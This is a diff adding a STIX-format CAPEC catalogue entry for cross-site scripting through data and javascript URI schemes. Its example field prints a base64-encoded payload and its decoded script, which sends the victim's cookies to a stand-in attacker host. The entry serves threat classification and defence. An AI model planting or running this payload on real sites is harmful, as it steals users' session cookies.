@@ -1,0 +1,97 @@
+{
+    "type": "bundle",
+    "id": "bundle--00898367-8cd6-4a09-b7c2-81ae12e25b4d",
+    "spec_version": "2.0",
+    "objects": [
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--c77ec906-0371-482e-8b14-a4a41b6b5b74",
+            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
+            "created": "2014-06-23T00:00:00.000Z",
+            "modified": "2019-04-04T00:00:00.000Z",
+            "name": "XSS Targeting URI Placeholders",
+            "description": "An attack of this type exploits the ability of most browsers to interpret \"data\", \"javascript\" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "url": "https://capec.mitre.org/data/definitions/244.html",
+                    "external_id": "CAPEC-244"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/83.html",
+                    "external_id": "CWE-83"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "OWASP Testing Guide (v2), The Open Web Application Security Project (OWASP)",
+                    "url": "http://www.owasp.org/index.php/Testing_for_Cross_site_scripting",
+                    "external_id": "REF-70"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "Google Cross-Site Scripting HOWTO article, Google",
+                    "url": "https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki",
+                    "external_id": "REF-96"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "OWASP Cheatsheets, The Open Web Application Security Project (OWASP)",
+                    "url": "http://ha.ckers.org/xss.html",
+                    "external_id": "REF-97"
+                },
+                {
+                    "source_name": "reference_from_CAPEC",
+                    "description": "WASC Threat Classification 2.0, 2010, The Web Application Security Consortium (WASC)",
+                    "url": "http://projects.webappsec.org/Cross-Site+Scripting",
+                    "external_id": "REF-72"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
+            ],
+            "x_capec_abstraction": "Detailed",
+            "x_capec_consequences": {
+                "Access_Control": [
+                    "Bypass Protection Mechanism"
+                ],
+                "Accountability": [
+                    "Gain Privileges"
+                ],
+                "Authentication": [
+                    "Gain Privileges"
+                ],
+                "Authorization": [
+                    "Execute Unauthorized Commands (Run Arbitrary Code)",
+                    "Gain Privileges",
+                    "Bypass Protection Mechanism"
+                ],
+                "Confidentiality": [
+                    "Read Data"
+                ],
+                "Integrity": [
+                    "Modify Data"
+                ],
+                "Non-Repudiation": [
+                    "Gain Privileges"
+                ]
+            },
+            "x_capec_example_instances": [
+                "\n               <xhtml:p>The following payload data:</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"informative\">text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==</xhtml:div>\n               <xhtml:p>represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser.</xhtml:p>\n               <xhtml:p>The decoded payload is the following piece of HTML code:</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"informative\"><html><xhtml:div style=\"margin-left:10px;\"><body><xhtml:div style=\"margin-left:10px;\"><script><xhtml:div style=\"margin-left:10px;\">var img = new Image();img.src = \"http://attacker.com/cookiegrabber?\"+ encodeURIComponent(document.cookies);</xhtml:div>\n                        </script></xhtml:div>\n                     </body></xhtml:div>\n                  </html></xhtml:div>\n               <xhtml:p>Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack.</xhtml:p>\n               <xhtml:p>An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute):</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"informative\"><a href=\"INJECTION_POINT\">My Link</a></xhtml:div>\n               <xhtml:p>Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</xhtml:p>\n            "
+            ],
+            "x_capec_likelihood_of_attack": "High",
+            "x_capec_prerequisites": [
+                "Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme."
+            ],
+            "x_capec_resources_required": [
+                "Ability to send HTTP request to a web application"
+            ],
+            "x_capec_skills_required": {
+                "Medium": "To inject the malicious payload in a web page"
+            },
+            "x_capec_status": "Draft",
+            "x_capec_typical_severity": "High",
+            "x_capec_version": "3.2"
+        }
+    ]
+}
